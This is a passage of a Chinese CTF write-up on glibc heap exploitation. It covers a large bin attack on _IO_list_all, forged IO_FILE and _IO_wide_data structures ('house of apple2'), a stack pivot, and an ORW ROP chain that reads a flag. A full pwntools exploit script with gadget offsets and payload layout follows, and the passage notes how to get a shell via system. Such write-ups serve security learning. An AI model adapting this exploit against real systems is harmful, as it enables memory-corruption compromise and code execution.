用上文提到的补充中的方法，先申请一个大的堆块，然后进入 `large bin` 中，然后篡改其 `bk_nextsize` 为 `target_addr-0x20` （此时用了唯一一次写的机会），还需要去写其他数据，这里后面再说，篡改完 `bk_nextsize` 后，再让一个略小的堆块进入 `large bin` 即可触发 `large bin attack` ，此时 `IO_list_all` 就为略小的堆块地址，但问题是我们只能控制大堆块中的数据，参考了 **winmt** 师傅的做法，再申请与小堆块等大的堆块就会从 `large bin` 中取出来小堆块，这样就会触发 `unlink` ，代码如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022258433.png" alt="image-20230202225821151" style="zoom:50%;" />

此时这几个指针为

![image-20230202225959295](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022259382.png)

这个 `p->bk_nextsize` 是  `IO_list_all-0x20` 的地址，而触发 `p->bk_nextsize->fd_nextsize = p->fd_nextsize` 就将大堆块的地址写入了 `IO_list_all-0x20+0x20` 的位置，所以只要再申请一个和小堆块等大的堆块，触发这个 `unlink` 就可以将大堆块的地址写入 `IO_list_all` 中了（**roderick** 师傅和**winmt** 师傅都太强了）

###### 伪造结构体&&布局

控制了链表头指针，就意味着接下来就可以开始伪造 `IO_FILE` 了，因为这个 `IO_FILE` 的前几个字段都无法改变（因为是堆块的 `prev_size` `size` `fd` `bk` `fd_nextsize` `bk_nextsize` 字段），这会干扰我们伪造 `IO_FILE` 的字段（比如 `_flags` 字段这里我们不可控），因此我们这个结构体只控制 `IO_write_base` 和 `_chain` 字段，我专门把 `IO_write_base` 改成 `IO_list_all` 是因为这个字段需要大于 `IO_write_ptr` 字段，才不会触发 `overflow` ，然后通过 `_chain` 遍历到下个结构体的时候去开始真正利用。（此时伪造的第一个结构体如下）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022310901.png" alt="image-20230202231015667" style="zoom:50%;" />



接下来就要开始伪造触发 `overflow` 的这个 `IO_FILE` 结构体了，条件按照上面 `house of apple2` 中总结的伪造即可，这里伪造字段没啥可说的，只能对着 `gdb` 一点一点把偏移调出来，然后布局好，因为还要再布置一个 `wide_data` 结构体，所以调试起来要花费点时间。慢慢的按照每个条件的要求控制每个字段即可，下面直接给出最后伪造出来的结构体。

这是触发 `overflow` 的第二个伪造的 `IO_FILE`

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022316010.png" alt="image-20230202231655803" style="zoom:50%;" />



下面这个是伪造的 `_IO_wide_data` 结构体，因为堆块很大，所以放心布置即可

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318082.png" alt="image-20230202231820885" style="zoom:50%;" />

![image-20230202231830333](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318642.png)



如果要获取 `shell` 的话，那控制 `IO_FILE` 的 `_flags` 字段为参数， `_wide_vtable` 中的 `overflow` 改成 `system` 地址即可获取  `shell`。

###### 栈迁移&&rop

但是打 `orw` 的话要略微麻烦一点，我这里是采用了 `winmt` 师傅提到的一个 [方法](https://bbs.kanxue.com/thread-272098.htm)，利用下面这段 `gadget` 打了一个栈迁移，因为 `rdi+0x48` 可控（`rdi` 就是 `IO_FILE` 的首地址），所以 `rbp` 可控，所以 `rax` 可控，所以 ` call   QWORD PTR [rax+0x28]` 可以控制程序的执行流，这里的执行流去调用 `leave ; ret` 进行一个栈迁移

```assembly
<svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
<svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
<svcudp_reply+34>:    lea    r13,[rbp+0x10]
<svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
<svcudp_reply+45>:    mov    rdi,r13
<svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
```

下面是正在执行这段 `gadget` 的情况

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022329670.png" alt="image-20230202232950364" style="zoom:50%;" />

下图为栈迁移后的情况，接下来触发 `rop` 链

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022330494.png" alt="image-20230202233043116" style="zoom:50%;" />



最后 `orw` 的 `rop` 链如下，此时将要开始执行

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022332120.png" alt="image-20230202233224913" style="zoom:50%;" />



##### EXP

[tools源码](https://zikh26.github.io/posts/ad411136.html)

```py
from tools import *
context.log_level='debug'
context.arch='amd64'
d_a=0x13B9
d_d=0x13C3
d_r=0x13E0
d_w=0x13FD 
p,e,libc=load('a')

def add(choice):
    p.sendlineafter("enter your command: \n",str(1))
    p.sendlineafter("choise: ",str(choice))
    
def delete(index):
    p.sendlineafter("enter your command: \n",str(2))
    p.sendlineafter("Index: \n",str(index))
    
def read_data(index,content):
    p.sendlineafter("enter your command: \n",str(3))
    p.sendlineafter("Index: ",str(index))
    p.sendafter("Message: ",content)

def write_data(index):
    p.sendlineafter("enter your command: \n",str(4))
    p.sendlineafter("Index: ",str(index))
    
p.sendlineafter("enter your key >>\n",str(8))

add(2)
add(1)
add(1)
add(1)
delete(0)
delete(2)

write_data(0)
p.recvuntil("Message: \n")
libc_base=u64(p.recv(6).ljust(8,b'\x00'))-0x219ce0
p.recv(2)
heap_base=u64(p.recv(6).ljust(8,b'\x00'))-0x13c0
log_addr('libc_base')
log_addr('heap_base')

add(1)
delete(2)

io_list_all=libc_base+libc.symbols['_IO_list_all']
_IO_wfile_jumps=libc_base+0x2160c0
system=libc_base+libc.symbols['system']
leave_ret=libc_base+0x00000000000562ec
magic_gadget=libc_base+0x16a1fa
pop_rsp_ret=0x0000000000035732+libc_base
pop_rdi_ret=libc_base+0x000000000002a3e5
add_rsp_ret=0x000000000003a889+libc_base
pop_rsi_ret=libc_base+0x000000000002be51
pop_rdx_r12_ret=libc_base+0x000000000011f497
open_addr=libc_base+libc.symbols['open']
read_addr=libc_base+libc.symbols['read']
write_addr=libc_base+libc.symbols['write']
pop_rax_ret=libc_base+0x0000000000045eb0
syscall=libc_base+0xea5b9

#open
rop=p64(pop_rdi_ret)
rop+=p64(heap_base+0x518)# 'flag' address
rop+=p64(pop_rsi_ret)
rop+=p64(0)
rop+=p64(pop_rax_ret)
rop+=p64(2)
rop+=p64(syscall)

#read
rop+=p64(pop_rdi_ret)
rop+=p64(3)
rop+=p64(pop_rsi_ret)
rop+=p64(heap_base+0xb40)# flag store address
rop+=p64(pop_rdx_r12_ret)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(read_addr)

#write
rop+=p64(pop_rdi_ret)
rop+=p64(1)
rop+=p64(pop_rsi_ret)
rop+=p64(heap_base+0xb40)# flag store address
rop+=p64(pop_rdx_r12_ret)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(write_addr)


wide_data=p64(0)*21
wide_data+=p64(leave_ret)#second call
wide_data+=p64(0)*3
wide_data+=b"./flag\x00\x00"
wide_data+=p64(add_rsp_ret)#第二次栈迁移  原因是rop链不能破坏下面的magic_gadget
wide_data+=p64(0)
wide_data+=p64(heap_base+0x450-0x68+(8*29))
wide_data+=p64(magic_gadget)#first call
wide_data+=rop



io_file=p64(~(2 | 0x8 | 0x800)+(1<<64))#_flags
io_file+=p64(0)*3
io_file+=p64(0)+p64(1)#write_base && write_ptr
io_file+=p64(0)*3
io_file+=p64(heap_base+0x538-0x20)#rbp  [rdi+0x48]
io_file+=p64(0)*10
io_file+=p64(heap_base+0x450)#wide_data
io_file+=p64(0)*6
io_file+=p64(_IO_wfile_jumps)

payload=p64(libc_base+0x21a1f0)*2+p64(io_list_all)+p64(io_list_all-0x20)#io_write_base控制为io_list_all 因为需要大于io_write_ptr不触发overflow
payload+=p64(0)*7
payload+=p64(heap_base+0x370)#chain    指向了第一个伪造的结构体的vtable
payload+=p64(0)*14
payload+=io_file
payload+=wide_data

read_data(0,payload.ljust(0x880,b'\x00'))
add(3)
debug(p,'pie',d_a,d_d,d_w,d_r,0x12BC)
add(1)
p.sendlineafter("enter your command: \n",str(5))
p.interactive()
```



![image-20230202233408774](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022334166.png)



#### 总结：

首先感谢 **roderick** 师傅分享这种攻击方法，`house of apple2` 所需的条件较少，是一种很优秀的攻击方法。

在学习的过程中，尽量多翻看源码，捋清函数的执行流，清楚需要绕过的检查以及所伪造的字段。在实际的题目中，需要经常使用 `gdb` 调试来边调边布局结构体中的数据，自己进入调试那种状态很美妙，似乎只有自己知道自己在做什么，通过调试来预测以及验证接下来程序的变化是很享受的一件事情（尽管重复的敲击那几个按键，手会比较酸 ->.-> ），这种东西只可意会不可言传。

多动手，多思考就会离真相更近一步。



### 参考文章：

https://bbs.kanxue.com/thread-273418.htm

[House of Apple 一种新的glibc中IO攻击方法 (2) - roderick - record and learn! (roderickchan.cn)](https://www.roderickchan.cn/post/house-of-apple-一种新的glibc中io攻击方法-2/)

https://bbs.kanxue.com/thread-272098.htm
